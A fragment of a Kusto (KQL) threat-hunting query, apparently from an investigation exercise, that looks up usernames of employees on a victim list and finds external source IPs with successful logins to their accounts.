| distinct NameEmployee;
let victimsusername =
Employees
| where email_addr has_any (victims)
| distinct username;
AuthenticationEvents
| where username in (victimsusername)
| where result contains "successful"
| where src_ip !startswith "10.10"
| distinct src_ip //43

